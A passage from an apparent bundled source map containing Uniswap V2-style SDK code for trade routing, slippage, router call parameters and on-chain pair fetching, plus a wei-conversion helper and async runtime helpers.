TokenAmount(this.liquidityToken, liquidity)\n  }\n\n  public getLiquidityValue(\n    token: Token,\n    totalSupply: TokenAmount,\n    liquidity: TokenAmount,\n    feeOn: boolean = false,\n    kLast?: BigintIsh\n  ): TokenAmount {\n    invariant(this.involvesToken(token), 'TOKEN')\n    invariant(totalSupply.token.equals(this.liquidityToken), 'TOTAL_SUPPLY')\n    invariant(liquidity.token.equals(this.liquidityToken), 'LIQUIDITY')\n    invariant(JSBI.lessThanOrEqual(liquidity.raw, totalSupply.raw), 'LIQUIDITY')\n\n    let totalSupplyAdjusted: TokenAmount\n    if (!feeOn) {\n      totalSupplyAdjusted = totalSupply\n    } else {\n      invariant(!!kLast, 'K_LAST')\n      const kLastParsed = parseBigintIsh(kLast)\n      if (!JSBI.equal(kLastParsed, ZERO)) {\n        const rootK = sqrt(JSBI.multiply(this.reserve0.raw, this.reserve1.raw))\n        const rootKLast = sqrt(kLastParsed)\n        if (JSBI.greaterThan(rootK, rootKLast)) {\n          const numerator = JSBI.multiply(totalSupply.raw, JSBI.subtract(rootK, rootKLast))\n          const denominator = JSBI.add(JSBI.multiply(rootK, FIVE), rootKLast)\n          const feeLiquidity = JSBI.divide(numerator, denominator)\n          totalSupplyAdjusted = totalSupply.add(new TokenAmount(this.liquidityToken, feeLiquidity))\n        } else {\n          totalSupplyAdjusted = totalSupply\n        }\n      } else {\n        totalSupplyAdjusted = totalSupply\n      }\n    }\n\n    return new TokenAmount(\n      token,\n      JSBI.divide(JSBI.multiply(liquidity.raw, this.reserveOf(token).raw), totalSupplyAdjusted.raw)\n    )\n  }\n}\n","import { ChainId } from '../constants'\nimport invariant from 'tiny-invariant'\n\nimport { Currency, ETHER } from './currency'\nimport { Token, WETH } from './token'\nimport { Pair } from './pair'\nimport { Price } from './fractions/price'\n\nexport class Route {\n  public readonly pairs: Pair[]\n  public readonly path: Token[]\n  public readonly input: Currency\n  public readonly output: Currency\n  public readonly midPrice: Price\n\n  public constructor(pairs: Pair[], input: Currency, output?: Currency) {\n    invariant(pairs.length > 0, 'PAIRS')\n    invariant(\n      pairs.every(pair => pair.chainId === pairs[0].chainId),\n      'CHAIN_IDS'\n    )\n    invariant(\n      (input instanceof Token && pairs[0].involvesToken(input)) ||\n        (input === ETHER && pairs[0].involvesToken(WETH[pairs[0].chainId])),\n      'INPUT'\n    )\n    invariant(\n      typeof output === 'undefined' ||\n        (output instanceof Token && pairs[pairs.length - 1].involvesToken(output)) ||\n        (output === ETHER && pairs[pairs.length - 1].involvesToken(WETH[pairs[0].chainId])),\n      'OUTPUT'\n    )\n\n    const path: Token[] = [input instanceof Token ? input : WETH[pairs[0].chainId]]\n    for (const [i, pair] of pairs.entries()) {\n      const currentInput = path[i]\n      invariant(currentInput.equals(pair.token0) || currentInput.equals(pair.token1), 'PATH')\n      const output = currentInput.equals(pair.token0) ? pair.token1 : pair.token0\n      path.push(output)\n    }\n\n    this.pairs = pairs\n    this.path = path\n    this.midPrice = Price.fromRoute(this)\n    this.input = input\n    this.output = output ?? path[path.length - 1]\n  }\n\n  public get chainId(): ChainId {\n    return this.pairs[0].chainId\n  }\n}\n","import { Rounding, _100 } from '../../constants'\nimport { Fraction } from './fraction'\n\nconst _100_PERCENT = new Fraction(_100)\n\nexport class Percent extends Fraction {\n  public toSignificant(significantDigits: number = 5, format?: object, rounding?: Rounding): string {\n    return this.multiply(_100_PERCENT).toSignificant(significantDigits, format, rounding)\n  }\n\n  public toFixed(decimalPlaces: number = 2, format?: object, rounding?: Rounding): string {\n    return this.multiply(_100_PERCENT).toFixed(decimalPlaces, format, rounding)\n  }\n}\n","import invariant from 'tiny-invariant'\n\nimport { ChainId, ONE, TradeType, ZERO } from '../constants'\nimport { sortedInsert } from '../utils'\nimport { Currency, ETHER } from './currency'\nimport { CurrencyAmount } from './fractions/currencyAmount'\nimport { Fraction } from './fractions/fraction'\nimport { Percent } from './fractions/percent'\nimport { Price } from './fractions/price'\nimport { TokenAmount } from './fractions/tokenAmount'\nimport { Pair } from './pair'\nimport { Route } from './route'\nimport { currencyEquals, Token, WETH } from './token'\n\n/**\n * Returns the percent difference between the mid price and the execution price, i.e. price impact.\n * @param midPrice mid price before the trade\n * @param inputAmount the input amount of the trade\n * @param outputAmount the output amount of the trade\n */\nfunction computePriceImpact(midPrice: Price, inputAmount: CurrencyAmount, outputAmount: CurrencyAmount): Percent {\n  const exactQuote = midPrice.raw.multiply(inputAmount.raw)\n  // calculate slippage := (exactQuote - outputAmount) / exactQuote\n  const slippage = exactQuote.subtract(outputAmount.raw).divide(exactQuote)\n  return new Percent(slippage.numerator, slippage.denominator)\n}\n\n// minimal interface so the input output comparator may be shared across types\ninterface InputOutput {\n  readonly inputAmount: CurrencyAmount\n  readonly outputAmount: CurrencyAmount\n}\n\n// comparator function that allows sorting trades by their output amounts, in decreasing order, and then input amounts\n// in increasing order. i.e. the best trades have the most outputs for the least inputs and are sorted first\nexport function inputOutputComparator(a: InputOutput, b: InputOutput): number {\n  // must have same input and output token for comparison\n  invariant(currencyEquals(a.inputAmount.currency, b.inputAmount.currency), 'INPUT_CURRENCY')\n  invariant(currencyEquals(a.outputAmount.currency, b.outputAmount.currency), 'OUTPUT_CURRENCY')\n  if (a.outputAmount.equalTo(b.outputAmount)) {\n    if (a.inputAmount.equalTo(b.inputAmount)) {\n      return 0\n    }\n    // trade A requires less input than trade B, so A should come first\n    if (a.inputAmount.lessThan(b.inputAmount)) {\n      return -1\n    } else {\n      return 1\n    }\n  } else {\n    // tradeA has less output than trade B, so should come second\n    if (a.outputAmount.lessThan(b.outputAmount)) {\n      return 1\n    } else {\n      return -1\n    }\n  }\n}\n\n// extension of the input output comparator that also considers other dimensions of the trade in ranking them\nexport function tradeComparator(a: Trade, b: Trade) {\n  const ioComp = inputOutputComparator(a, b)\n  if (ioComp !== 0) {\n    return ioComp\n  }\n\n  // consider lowest slippage next, since these are less likely to fail\n  if (a.priceImpact.lessThan(b.priceImpact)) {\n    return -1\n  } else if (a.priceImpact.greaterThan(b.priceImpact)) {\n    return 1\n  }\n\n  // finally consider the number of hops since each hop costs gas\n  return a.route.path.length - b.route.path.length\n}\n\nexport interface BestTradeOptions {\n  // how many results to return\n  maxNumResults?: number\n  // the maximum number of hops a trade should contain\n  maxHops?: number\n}\n\n/**\n * Given a currency amount and a chain ID, returns the equivalent representation as the token amount.\n * In other words, if the currency is ETHER, returns the WETH token amount for the given chain. Otherwise, returns\n * the input currency amount.\n */\nfunction wrappedAmount(currencyAmount: CurrencyAmount, chainId: ChainId): TokenAmount {\n  if (currencyAmount instanceof TokenAmount) return currencyAmount\n  if (currencyAmount.currency === ETHER) return new TokenAmount(WETH[chainId], currencyAmount.raw)\n  invariant(false, 'CURRENCY')\n}\n\nfunction wrappedCurrency(currency: Currency, chainId: ChainId): Token {\n  if (currency instanceof Token) return currency\n  if (currency === ETHER) return WETH[chainId]\n  invariant(false, 'CURRENCY')\n}\n\n/**\n * Represents a trade executed against a list of pairs.\n * Does not account for slippage, i.e. trades that front run this trade and move the price.\n */\nexport class Trade {\n  /**\n   * The route of the trade, i.e. which pairs the trade goes through.\n   */\n  public readonly route: Route\n  /**\n   * The type of the trade, either exact in or exact out.\n   */\n  public readonly tradeType: TradeType\n  /**\n   * The input amount for the trade assuming no slippage.\n   */\n  public readonly inputAmount: CurrencyAmount\n  /**\n   * The output amount for the trade assuming no slippage.\n   */\n  public readonly outputAmount: CurrencyAmount\n  /**\n   * The price expressed in terms of output amount/input amount.\n   */\n  public readonly executionPrice: Price\n  /**\n   * The mid price after the trade executes assuming no slippage.\n   */\n  public readonly nextMidPrice: Price\n  /**\n   * The percent difference between the mid price before the trade and the trade execution price.\n   */\n  public readonly priceImpact: Percent\n\n  /**\n   * Constructs an exact in trade with the given amount in and route\n   * @param route route of the exact in trade\n   * @param amountIn the amount being passed in\n   */\n  public static exactIn(route: Route, amountIn: CurrencyAmount): Trade {\n    return new Trade(route, amountIn, TradeType.EXACT_INPUT)\n  }\n\n  /**\n   * Constructs an exact out trade with the given amount out and route\n   * @param route route of the exact out trade\n   * @param amountOut the amount returned by the trade\n   */\n  public static exactOut(route: Route, amountOut: CurrencyAmount): Trade {\n    return new Trade(route, amountOut, TradeType.EXACT_OUTPUT)\n  }\n\n  public constructor(route: Route, amount: CurrencyAmount, tradeType: TradeType) {\n    const amounts: TokenAmount[] = new Array(route.path.length)\n    const nextPairs: Pair[] = new Array(route.pairs.length)\n    if (tradeType === TradeType.EXACT_INPUT) {\n      invariant(currencyEquals(amount.currency, route.input), 'INPUT')\n      amounts[0] = wrappedAmount(amount, route.chainId)\n      for (let i = 0; i < route.path.length - 1; i++) {\n        const pair = route.pairs[i]\n        const [outputAmount, nextPair] = pair.getOutputAmount(amounts[i])\n        amounts[i + 1] = outputAmount\n        nextPairs[i] = nextPair\n      }\n    } else {\n      invariant(currencyEquals(amount.currency, route.output), 'OUTPUT')\n      amounts[amounts.length - 1] = wrappedAmount(amount, route.chainId)\n      for (let i = route.path.length - 1; i > 0; i--) {\n        const pair = route.pairs[i - 1]\n        const [inputAmount, nextPair] = pair.getInputAmount(amounts[i])\n        amounts[i - 1] = inputAmount\n        nextPairs[i - 1] = nextPair\n      }\n    }\n\n    this.route = route\n    this.tradeType = tradeType\n    this.inputAmount =\n      tradeType === TradeType.EXACT_INPUT\n        ? amount\n        : route.input === ETHER\n        ? CurrencyAmount.ether(amounts[0].raw)\n        : amounts[0]\n    this.outputAmount =\n      tradeType === TradeType.EXACT_OUTPUT\n        ? amount\n        : route.output === ETHER\n        ? CurrencyAmount.ether(amounts[amounts.length - 1].raw)\n        : amounts[amounts.length - 1]\n    this.executionPrice = new Price(\n      this.inputAmount.currency,\n      this.outputAmount.currency,\n      this.inputAmount.raw,\n      this.outputAmount.raw\n    )\n    this.nextMidPrice = Price.fromRoute(new Route(nextPairs, route.input))\n    this.priceImpact = computePriceImpact(route.midPrice, this.inputAmount, this.outputAmount)\n  }\n\n  /**\n   * Get the minimum amount that must be received from this trade for the given slippage tolerance\n   * @param slippageTolerance tolerance of unfavorable slippage from the execution price of this trade\n   */\n  public minimumAmountOut(slippageTolerance: Percent): CurrencyAmount {\n    invariant(!slippageTolerance.lessThan(ZERO), 'SLIPPAGE_TOLERANCE')\n    if (this.tradeType === TradeType.EXACT_OUTPUT) {\n      return this.outputAmount\n    } else {\n      const slippageAdjustedAmountOut = new Fraction(ONE)\n        .add(slippageTolerance)\n        .invert()\n        .multiply(this.outputAmount.raw).quotient\n      return this.outputAmount instanceof TokenAmount\n        ? new TokenAmount(this.outputAmount.token, slippageAdjustedAmountOut)\n        : CurrencyAmount.ether(slippageAdjustedAmountOut)\n    }\n  }\n\n  /**\n   * Get the maximum amount in that can be spent via this trade for the given slippage tolerance\n   * @param slippageTolerance tolerance of unfavorable slippage from the execution price of this trade\n   */\n  public maximumAmountIn(slippageTolerance: Percent): CurrencyAmount {\n    invariant(!slippageTolerance.lessThan(ZERO), 'SLIPPAGE_TOLERANCE')\n    if (this.tradeType === TradeType.EXACT_INPUT) {\n      return this.inputAmount\n    } else {\n      const slippageAdjustedAmountIn = new Fraction(ONE).add(slippageTolerance).multiply(this.inputAmount.raw).quotient\n      return this.inputAmount instanceof TokenAmount\n        ? new TokenAmount(this.inputAmount.token, slippageAdjustedAmountIn)\n        : CurrencyAmount.ether(slippageAdjustedAmountIn)\n    }\n  }\n\n  /**\n   * Given a list of pairs, and a fixed amount in, returns the top `maxNumResults` trades that go from an input token\n   * amount to an output token, making at most `maxHops` hops.\n   * Note this does not consider aggregation, as routes are linear. It's possible a better route exists by splitting\n   * the amount in among multiple routes.\n   * @param pairs the pairs to consider in finding the best trade\n   * @param currencyAmountIn exact amount of input currency to spend\n   * @param currencyOut the desired currency out\n   * @param maxNumResults maximum number of results to return\n   * @param maxHops maximum number of hops a returned trade can make, e.g. 1 hop goes through a single pair\n   * @param currentPairs used in recursion; the current list of pairs\n   * @param originalAmountIn used in recursion; the original value of the currencyAmountIn parameter\n   * @param bestTrades used in recursion; the current list of best trades\n   */\n  public static bestTradeExactIn(\n    pairs: Pair[],\n    currencyAmountIn: CurrencyAmount,\n    currencyOut: Currency,\n    { maxNumResults = 3, maxHops = 3 }: BestTradeOptions = {},\n    // used in recursion.\n    currentPairs: Pair[] = [],\n    originalAmountIn: CurrencyAmount = currencyAmountIn,\n    bestTrades: Trade[] = []\n  ): Trade[] {\n    invariant(pairs.length > 0, 'PAIRS')\n    invariant(maxHops > 0, 'MAX_HOPS')\n    invariant(originalAmountIn === currencyAmountIn || currentPairs.length > 0, 'INVALID_RECURSION')\n    const chainId: ChainId | undefined =\n      currencyAmountIn instanceof TokenAmount\n        ? currencyAmountIn.token.chainId\n        : currencyOut instanceof Token\n        ? currencyOut.chainId\n        : undefined\n    invariant(chainId !== undefined, 'CHAIN_ID')\n\n    const amountIn = wrappedAmount(currencyAmountIn, chainId)\n    const tokenOut = wrappedCurrency(currencyOut, chainId)\n    for (let i = 0; i < pairs.length; i++) {\n      const pair = pairs[i]\n      // pair irrelevant\n      if (!pair.token0.equals(amountIn.token) && !pair.token1.equals(amountIn.token)) continue\n      if (pair.reserve0.equalTo(ZERO) || pair.reserve1.equalTo(ZERO)) continue\n\n      let amountOut: TokenAmount\n      try {\n        ;[amountOut] = pair.getOutputAmount(amountIn)\n      } catch (error) {\n        // input too low\n        if (error.isInsufficientInputAmountError) {\n          continue\n        }\n        throw error\n      }\n      // we have arrived at the output token, so this is the final trade of one of the paths\n      if (amountOut.token.equals(tokenOut)) {\n        sortedInsert(\n          bestTrades,\n          new Trade(\n            new Route([...currentPairs, pair], originalAmountIn.currency, currencyOut),\n            originalAmountIn,\n            TradeType.EXACT_INPUT\n          ),\n          maxNumResults,\n          tradeComparator\n        )\n      } else if (maxHops > 1 && pairs.length > 1) {\n        const pairsExcludingThisPair = pairs.slice(0, i).concat(pairs.slice(i + 1, pairs.length))\n\n        // otherwise, consider all the other paths that lead from this token as long as we have not exceeded maxHops\n        Trade.bestTradeExactIn(\n          pairsExcludingThisPair,\n          amountOut,\n          currencyOut,\n          {\n            maxNumResults,\n            maxHops: maxHops - 1\n          },\n          [...currentPairs, pair],\n          originalAmountIn,\n          bestTrades\n        )\n      }\n    }\n\n    return bestTrades\n  }\n\n  /**\n   * similar to the above method but instead targets a fixed output amount\n   * given a list of pairs, and a fixed amount out, returns the top `maxNumResults` trades that go from an input token\n   * to an output token amount, making at most `maxHops` hops\n   * note this does not consider aggregation, as routes are linear. it's possible a better route exists by splitting\n   * the amount in among multiple routes.\n   * @param pairs the pairs to consider in finding the best trade\n   * @param currencyIn the currency to spend\n   * @param currencyAmountOut the exact amount of currency out\n   * @param maxNumResults maximum number of results to return\n   * @param maxHops maximum number of hops a returned trade can make, e.g. 1 hop goes through a single pair\n   * @param currentPairs used in recursion; the current list of pairs\n   * @param originalAmountOut used in recursion; the original value of the currencyAmountOut parameter\n   * @param bestTrades used in recursion; the current list of best trades\n   */\n  public static bestTradeExactOut(\n    pairs: Pair[],\n    currencyIn: Currency,\n    currencyAmountOut: CurrencyAmount,\n    { maxNumResults = 3, maxHops = 3 }: BestTradeOptions = {},\n    // used in recursion.\n    currentPairs: Pair[] = [],\n    originalAmountOut: CurrencyAmount = currencyAmountOut,\n    bestTrades: Trade[] = []\n  ): Trade[] {\n    invariant(pairs.length > 0, 'PAIRS')\n    invariant(maxHops > 0, 'MAX_HOPS')\n    invariant(originalAmountOut === currencyAmountOut || currentPairs.length > 0, 'INVALID_RECURSION')\n    const chainId: ChainId | undefined =\n      currencyAmountOut instanceof TokenAmount\n        ? currencyAmountOut.token.chainId\n        : currencyIn instanceof Token\n        ? currencyIn.chainId\n        : undefined\n    invariant(chainId !== undefined, 'CHAIN_ID')\n\n    const amountOut = wrappedAmount(currencyAmountOut, chainId)\n    const tokenIn = wrappedCurrency(currencyIn, chainId)\n    for (let i = 0; i < pairs.length; i++) {\n      const pair = pairs[i]\n      // pair irrelevant\n      if (!pair.token0.equals(amountOut.token) && !pair.token1.equals(amountOut.token)) continue\n      if (pair.reserve0.equalTo(ZERO) || pair.reserve1.equalTo(ZERO)) continue\n\n      let amountIn: TokenAmount\n      try {\n        ;[amountIn] = pair.getInputAmount(amountOut)\n      } catch (error) {\n        // not enough liquidity in this pair\n        if (error.isInsufficientReservesError) {\n          continue\n        }\n        throw error\n      }\n      // we have arrived at the input token, so this is the first trade of one of the paths\n      if (amountIn.token.equals(tokenIn)) {\n        sortedInsert(\n          bestTrades,\n          new Trade(\n            new Route([pair, ...currentPairs], currencyIn, originalAmountOut.currency),\n            originalAmountOut,\n            TradeType.EXACT_OUTPUT\n          ),\n          maxNumResults,\n          tradeComparator\n        )\n      } else if (maxHops > 1 && pairs.length > 1) {\n        const pairsExcludingThisPair = pairs.slice(0, i).concat(pairs.slice(i + 1, pairs.length))\n\n        // otherwise, consider all the other paths that arrive at this token as long as we have not exceeded maxHops\n        Trade.bestTradeExactOut(\n          pairsExcludingThisPair,\n          currencyIn,\n          amountIn,\n          {\n            maxNumResults,\n            maxHops: maxHops - 1\n          },\n          [pair, ...currentPairs],\n          originalAmountOut,\n          bestTrades\n        )\n      }\n    }\n\n    return bestTrades\n  }\n}\n","import { TradeType } from './constants'\nimport invariant from 'tiny-invariant'\nimport { validateAndParseAddress } from './utils'\nimport { CurrencyAmount, ETHER, Percent, Trade } from './entities'\n\n/**\n * Options for producing the arguments to send call to the router.\n */\nexport interface TradeOptions {\n  /**\n   * How much the execution price is allowed to move unfavorably from the trade execution price.\n   */\n  allowedSlippage: Percent\n  /**\n   * How long the swap is valid until it expires, in seconds.\n   * This will be used to produce a `deadline` parameter which is computed from when the swap call parameters\n   * are generated.\n   */\n  ttl: number\n  /**\n   * The account that should receive the output of the swap.\n   */\n  recipient: string\n\n  /**\n   * Whether any of the tokens in the path are fee on transfer tokens, which should be handled with special methods\n   */\n  feeOnTransfer?: boolean\n}\n\n/**\n * The parameters to use in the call to the Uniswap V2 Router to execute a trade.\n */\nexport interface SwapParameters {\n  /**\n   * The method to call on the Uniswap V2 Router.\n   */\n  methodName: string\n  /**\n   * The arguments to pass to the method, all hex encoded.\n   */\n  args: (string | string[])[]\n  /**\n   * The amount of wei to send in hex.\n   */\n  value: string\n}\n\nfunction toHex(currencyAmount: CurrencyAmount) {\n  return `0x${currencyAmount.raw.toString(16)}`\n}\n\nconst ZERO_HEX = '0x0'\n\n/**\n * Represents the Uniswap V2 Router, and has static methods for helping execute trades.\n */\nexport abstract class Router {\n  /**\n   * Cannot be constructed.\n   */\n  private constructor() {}\n  /**\n   * Produces the on-chain method name to call and the hex encoded parameters to pass as arguments for a given trade.\n   * @param trade to produce call parameters for\n   * @param options options for the call parameters\n   */\n  public static swapCallParameters(trade: Trade, options: TradeOptions): SwapParameters {\n    const etherIn = trade.inputAmount.currency === ETHER\n    const etherOut = trade.outputAmount.currency === ETHER\n    // the router does not support both ether in and out\n    invariant(!(etherIn && etherOut), 'ETHER_IN_OUT')\n    invariant(options.ttl > 0, 'TTL')\n\n    const to: string = validateAndParseAddress(options.recipient)\n    const amountIn: string = toHex(trade.maximumAmountIn(options.allowedSlippage))\n    const amountOut: string = toHex(trade.minimumAmountOut(options.allowedSlippage))\n    const path: string[] = trade.route.path.map(token => token.address)\n    const deadline = `0x${(Math.floor(new Date().getTime() / 1000) + options.ttl).toString(16)}`\n    const useFeeOnTransfer = Boolean(options.feeOnTransfer)\n\n    let methodName: string\n    let args: (string | string[])[]\n    let value: string\n    switch (trade.tradeType) {\n      case TradeType.EXACT_INPUT:\n        if (etherIn) {\n          methodName = useFeeOnTransfer ? 'swapExactETHForTokensSupportingFeeOnTransferTokens' : 'swapExactETHForTokens'\n          // (uint amountOutMin, address[] calldata path, address to, uint deadline)\n          args = [amountOut, path, to, deadline]\n          value = amountIn\n        } else if (etherOut) {\n          methodName = useFeeOnTransfer ? 'swapExactTokensForETHSupportingFeeOnTransferTokens' : 'swapExactTokensForETH'\n          // (uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n          args = [amountIn, amountOut, path, to, deadline]\n          value = ZERO_HEX\n        } else {\n          methodName = useFeeOnTransfer\n            ? 'swapExactTokensForTokensSupportingFeeOnTransferTokens'\n            : 'swapExactTokensForTokens'\n          // (uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n          args = [amountIn, amountOut, path, to, deadline]\n          value = ZERO_HEX\n        }\n        break\n      case TradeType.EXACT_OUTPUT:\n        invariant(!useFeeOnTransfer, 'EXACT_OUT_FOT')\n        if (etherIn) {\n          methodName = 'swapETHForExactTokens'\n          // (uint amountOut, address[] calldata path, address to, uint deadline)\n          args = [amountOut, path, to, deadline]\n          value = amountIn\n        } else if (etherOut) {\n          methodName = 'swapTokensForExactETH'\n          // (uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n          args = [amountOut, amountIn, path, to, deadline]\n          value = ZERO_HEX\n        } else {\n          methodName = 'swapTokensForExactTokens'\n          // (uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n          args = [amountOut, amountIn, path, to, deadline]\n          value = ZERO_HEX\n        }\n        break\n    }\n    return {\n      methodName,\n      args,\n      value\n    }\n  }\n}\n","import { Contract } from '@ethersproject/contracts'\nimport { getNetwork } from '@ethersproject/networks'\nimport { getDefaultProvider } from '@ethersproject/providers'\nimport { TokenAmount } from './entities/fractions/tokenAmount'\nimport { Pair } from './entities/pair'\nimport ISwapPair from './abis/SwapPair.json'\nimport invariant from 'tiny-invariant'\nimport ERC20 from './abis/ERC20.json'\nimport { ChainId } from './constants'\nimport { Token } from './entities/token'\n\nlet TOKEN_DECIMALS_CACHE: { [chainId: number]: { [address: string]: number } } = {\n  [ChainId.MAINNET]: {\n    '0xE0B7927c4aF23765Cb51314A0E0521A9645F0E2A': 9 // DGD\n  }\n}\n\n/**\n * Contains methods for constructing instances of pairs and tokens from on-chain data.\n */\nexport abstract class Fetcher {\n  /**\n   * Cannot be constructed.\n   */\n  private constructor() {}\n\n  /**\n   * Fetch information for a given token on the given chain, using the given ethers provider.\n   * @param chainId chain of the token\n   * @param address address of the token on the chain\n   * @param provider provider used to fetch the token\n   * @param symbol optional symbol of the token\n   * @param name optional name of the token\n   */\n  public static async fetchTokenData(\n    chainId: ChainId,\n    address: string,\n    provider = getDefaultProvider(getNetwork(chainId)),\n    symbol?: string,\n    name?: string\n  ): Promise<Token> {\n    const parsedDecimals =\n      typeof TOKEN_DECIMALS_CACHE?.[chainId]?.[address] === 'number'\n        ? TOKEN_DECIMALS_CACHE[chainId][address]\n        : await new Contract(address, ERC20, provider).decimals().then((decimals: number): number => {\n            TOKEN_DECIMALS_CACHE = {\n              ...TOKEN_DECIMALS_CACHE,\n              [chainId]: {\n                ...TOKEN_DECIMALS_CACHE?.[chainId],\n                [address]: decimals\n              }\n            }\n            return decimals\n          })\n    return new Token(chainId, address, parsedDecimals, symbol, name)\n  }\n\n  /**\n   * Fetches information about a pair and constructs a pair from the given two tokens.\n   * @param tokenA first token\n   * @param tokenB second token\n   * @param provider the provider to use to fetch the data\n   */\n  public static async fetchPairData(\n    tokenA: Token,\n    tokenB: Token,\n    provider = getDefaultProvider(getNetwork(tokenA.chainId))\n  ): Promise<Pair> {\n    invariant(tokenA.chainId === tokenB.chainId, 'CHAIN_ID')\n    const address = Pair.getAddress(tokenA, tokenB)\n    const [reserves0, reserves1] = await new Contract(address, ISwapPair.abi, provider).getReserves()\n    const balances = tokenA.sortsBefore(tokenB) ? [reserves0, reserves1] : [reserves1, reserves0]\n    return new Pair(new TokenAmount(tokenA, balances[0]), new TokenAmount(tokenB, balances[1]))\n  }\n}\n","import web3 from 'web3';\n\nexport const convertToWei = (value:any, decimal:any) => {\n  if (Number(decimal) === 18) return web3.utils.toWei(value.toString(), \"ether\");\n  else if (Number(decimal) === 6)\n    return web3.utils.toWei(value.toString(), \"picoether\");\n  else if (Number(decimal) === 9)\n    return web3.utils.toWei(value.toString(), \"nanoether\");\n  else if (Number(decimal) === 12)\n    return web3.utils.toWei(value.toString(), \"microether\");\n  else if (Number(decimal) === 15)\n    return web3.utils.toWei(value.toString(), \"milliether\");\n  else return value.toWei() / 10 ** Number(decimal);\n};\n\nexport const convertFromWei = (value:any, decimal:any) => {\n  if (Number(decimal) === 18) return web3.utils.fromWei(value.toString(), \"ether\");\n  else if (Number(decimal) === 6)\n    return web3.utils.fromWei(value.toString(), \"picoether\");\n  else if (Number(decimal) === 9)\n    return web3.utils.fromWei(value.toString(), \"nanoether\");\n  else if (Number(decimal) === 12)\n    return web3.utils.fromWei(value.toString(), \"microether\");\n  else if (Number(decimal) === 15)\n    return web3.utils.fromWei(value.toString(), \"milliether\");\n  else return value.toString() / 10 ** Number(decimal);\n};\nexport const convertFixed = (value:any) => {\n  if (Number(value) === 0) \n    return value ?.toFixed(2) ?.replace(/\\B(?=(\\d{3})+(?!\\d))/g, \",\"); \n  else if (Number(value) > 1e3)\n    return value ?.toFixed(0) ?.replace(/\\B(?=(\\d{3})+(?!\\d))/g, \",\"); \n  else if (Number(value) < 1 && Number(value) >= 9e-4) \n    return value?.toFixed(4); \n    else if (Number(value) < 9e-4 && Number(value) >= 9e-7) \n    return value?.toFixed(7); \n  else return value.toFixed(2);\n};\n\n","// A type of promise-like that resolves synchronously and supports only one observer\nexport const _Pact = /*#__PURE__*/(function() {\n\tfunction _Pact() {}\n\t_Pact.prototype.then = function(onFulfilled, onRejected) {\n\t\tconst result = new _Pact();\n\t\tconst state = this.s;\n\t\tif (state) {\n\t\t\tconst callback = state & 1 ? onFulfilled : onRejected;\n\t\t\tif (callback) {\n\t\t\t\ttry {\n\t\t\t\t\t_settle(result, 1, callback(this.v));\n\t\t\t\t} catch (e) {\n\t\t\t\t\t_settle(result, 2, e);\n\t\t\t\t}\n\t\t\t\treturn result;\n\t\t\t} else {\n\t\t\t\treturn this;\n\t\t\t}\n\t\t}\n\t\tthis.o = function(_this) {\n\t\t\ttry {\n\t\t\t\tconst value = _this.v;\n\t\t\t\tif (_this.s & 1) {\n\t\t\t\t\t_settle(result, 1, onFulfilled ? onFulfilled(value) : value);\n\t\t\t\t} else if (onRejected) {\n\t\t\t\t\t_settle(result, 1, onRejected(value));\n\t\t\t\t} else {\n\t\t\t\t\t_settle(result, 2, value);\n\t\t\t\t}\n\t\t\t} catch (e) {\n\t\t\t\t_settle(result, 2, e);\n\t\t\t}\n\t\t};\n\t\treturn result;\n\t}\n\treturn _Pact;\n})();\n\n// Settles a pact synchronously\nexport function _settle(pact, state, value) {\n\tif (!pact.s) {\n\t\tif (value instanceof _Pact) {\n\t\t\tif (value.s) {\n\t\t\t\tif (state & 1) {\n\t\t\t\t\tstate = value.s;\n\t\t\t\t}\n\t\t\t\tvalue = value.v;\n\t\t\t} else {\n\t\t\t\tvalue.o = _settle.bind(null, pact, state);\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\tif (value && value.then) {\n\t\t\tvalue.then(_settle.bind(null, pact, state), _settle.bind(null, pact, 2));\n\t\t\treturn;\n\t\t}\n\t\tpact.s = state;\n\t\tpact.v = value;\n\t\tconst observer = pact.o;\n\t\tif (observer) {\n\t\t\tobserver(pact);\n\t\t}\n\t}\n}\n\nexport function _isSettledPact(thenable) {\n\treturn thenable instanceof _Pact && thenable.s & 1;\n}\n\n// Converts argument to a function that always returns a Promise\nexport function _async(f) {\n\treturn function() {\n\t\tfor (var args = [], i = 0; i < arguments.length; i++) {\n\t\t\targs[i] = arguments[i];\n\t\t}\n\t\ttry {\n\t\t\treturn Promise.resolve(f.apply(this, args));\n\t\t} catch(e) {\n\t\t\treturn Promise.reject(e);\n\t\t}\n\t}\n}\n\n// Awaits on a value that may or may not be a Promise (equivalent to the await keyword in ES2015, with continuations passed explicitly)\nexport function _await(value, then, direct) {\n\tif (direct) {\n\t\treturn then ? then(value) : value;\n\t}\n\tif (!value || !value.then) {\n\t\tvalue = Promise.resolve(value);\n\t}\n\treturn then ? value.then(then) : value;\n}\n\n// Awaits on a value that may or may not be a Promise, then ignores it\nexport function _awaitIgnored(value, direct) {\n\tif (!direct) {\n\t\treturn value && value.then ? value.then(_empty) : Promise.resolve();\n\t}\n}\n\n// Proceeds after a value has resolved, or proceeds immediately if the value is not thenable\nexport function _continue(value, then) {\n\treturn value && value.then ? value.then(then) : then(value);\n}\n\n// Proceeds after a value has resolved, or proceeds immediately if the value is not thenable\nexport function _continueIgnored(value) {\n\tif (value && value.then) {\n\t\treturn value.then(_empty);\n\t}\n}\n\n// Asynchronously iterate through an object that has a length property, passing the index as the first argument to the callback (even as the length property changes)\nexport function _forTo(array, body, check) {\n\tvar i = -1, pact, reject;\n\tfunction _cycle(result) {\n\t\ttry {\n\t\t\twhile (++i < array.length && (!check || !check())) {\n\t\t\t\tresult = body(i);\n\t\t\t\tif (result && result.then) {\n\t\t\t\t\tif (_isSettledPact(result)) {\n\t\t\t\t\t\tresult = result.v;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tresult.then(_cycle, reject || (reject = _settle.bind(null, pact = new _Pact(), 2)));\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (pact) {\n\t\t\t\t_settle(pact, 1, result);\n\t\t\t} else {\n\t\t\t\tpact = result;\n\t\t\t}\n\t\t} catch (e) {\n\t\t\t_settle(pact || (pact = new _Pact()), 2, e);\n\t\t}\n\t}\n\t_cycle();\n\treturn pact;\n}\n\n// Asynchronously iterate through an object's properties (including properties inherited from the prototype)\n// Uses a snapshot of the object's properties\nexport function _forIn(target, body, check) {\n\tvar keys = [];\n\tfor (var key in target) 